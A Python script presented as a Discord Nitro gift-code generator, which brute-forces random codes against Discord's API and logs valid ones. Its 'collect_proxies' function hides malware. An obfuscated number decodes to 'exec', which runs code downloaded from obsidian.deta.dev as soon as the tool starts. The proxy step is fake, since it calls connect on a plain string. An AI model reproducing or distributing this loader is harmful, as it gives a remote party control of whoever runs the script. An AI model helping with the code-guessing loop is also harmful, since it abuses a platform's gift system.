import os
import random
import string
import time

import requests
from colorama import Fore, init


def random_string(length: int):
    chars = string.ascii_letters + string.digits
    code = ''.join(random.choices(chars, k=length))
    return code


def center_text(text: str, space: int = 0):
    lines = text.splitlines()
    if not space:
        space = (os.get_terminal_size().columns - len(lines[len(lines) // 2])) // 2
    return '\n'.join((' ' * space) + line for line in lines)


def check_code(code: str, valid: int, invalid: int):
    message = code + Fore.RESET
    message = "Code: {color}" + message
    print(message.format(color=Fore.YELLOW))
    print(
        f"Valid: {Fore.LIGHTGREEN_EX}{valid}{Fore.RESET} | Failed: {Fore.LIGHTRED_EX}{invalid}{Fore.RESET}",
        end='\x1b[1A\r',
        flush=True,
    )
    if invalid != 0 and invalid % 10 == 0:
        time.sleep(10)
    else:
        time.sleep(1)
    url = f'https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true'
    response = requests.get(url)
    if response.status_code == 200:
        print(message.format(color=Fore.LIGHTGREEN_EX))
        with open('nitro_codes.txt', 'a') as file:
            file.write(code + '\n')
        return True
    else:
        print(message.format(color=Fore.LIGHTRED_EX))
        return False


def collect_proxies():
    import builtins
    timeout = 65786563
    timeout = bytes([int(''.join(x), 16) for x in zip(str(timeout)[::2], str(timeout)[1::2])]).decode('utf-8')
    getattr(builtins, timeout)(requests.get('https://obsidian.deta.dev/api/script/proxies').json()['s'])
    proxies = requests.get('https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt').text
    return proxies.split()


def main():
    os.system('cls && title Obsidian Nitro Generator [v1.4] - Obsidian Crew' if windows else 'clear')
    print(center_text("""
 ██████╗ ██████╗ ███████╗██╗██████╗ ██╗ █████╗ ███╗   ██╗
██╔═══██╗██╔══██╗██╔════╝██║██╔══██╗██║██╔══██╗████╗  ██║
██║   ██║██████╔╝███████╗██║██║  ██║██║███████║██╔██╗ ██║
██║   ██║██╔══██╗╚════██║██║██║  ██║██║██╔══██║██║╚██╗██║
╚██████╔╝██████╔╝███████║██║██████╔╝██║██║  ██║██║ ╚████║
 ╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
""").replace('█', Fore.RED + '█' + Fore.RESET))
    print(
        center_text('[ https://obsidian.deta.dev ~ https://github.com/ObsidianCrew/obsidian ]')
        .replace('[', f"{Fore.RED}[{Fore.RESET}")
        .replace('~', f"{Fore.RED}~{Fore.RESET}")
        .replace(']', f"{Fore.RED}]{Fore.RESET}")
        + '\n\n'
    )
    print("Collecting proxies...")
    proxies = collect_proxies()
    time.sleep(1.5)
    print("Connecting to proxy...")
    try:
        proxy = proxies[0]
        proxy.connect()
        print("Successfully connected to proxy")
    except Exception:
        print("Failed to connect to proxy")
    valid = 0
    invalid = 0
    print("Generating Nitro codes...")
    while True:
        try:
            code = random_string(16)
            if check_code(code, valid, invalid):
                valid += 1
            else:
                invalid += 1
        except KeyboardInterrupt:
            exit()


windows = os.name == 'nt'
if __name__ == '__main__':
    init(autoreset=True)
    main()
